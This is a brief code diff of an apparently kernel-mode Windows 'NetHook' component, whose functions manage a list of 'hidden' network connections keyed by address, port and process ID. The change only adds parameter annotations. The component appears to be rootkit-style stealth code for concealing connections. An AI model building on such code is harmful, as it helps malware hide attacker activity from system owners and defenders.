@@ -25,7 +25,7 @@ NTSTATUS NetHook::InitNetworkHook()
 	return status;
 }
 
-VOID NetHook::NetAddHiddenConnection(PNETHOOK_HIDDEN_CONNECTION NewConnection)
+VOID NetHook::NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewConnection)
 {
 	if ((NewConnection->IpAddress == 0) && 
 		(NewConnection->RemoteIpAddress == 0) && 
@@ -112,7 +112,10 @@ VOID NetHook::NetAddHiddenConnection(PNETHOOK_HIDDEN_CONNECTION NewConnection)
 }
 
 
-BOOLEAN NetHook::NetIsHiddenIpAddress(ULONG IpAddress, const USHORT PortNumber, ULONG RemoteIpAddress, ULONG ConnectPID)
+BOOLEAN NetHook::NetIsHiddenIpAddress(_In_ const ULONG IpAddress,
+	_In_ const USHORT PortNumber,
+	_In_ const ULONG RemoteIpAddress,
+	_In_ const ULONG ConnectPID)
 {
 	PNET_CONNECTION_ENTRY CurrentEntry = g_NetworkLinkedListHead;
 	union
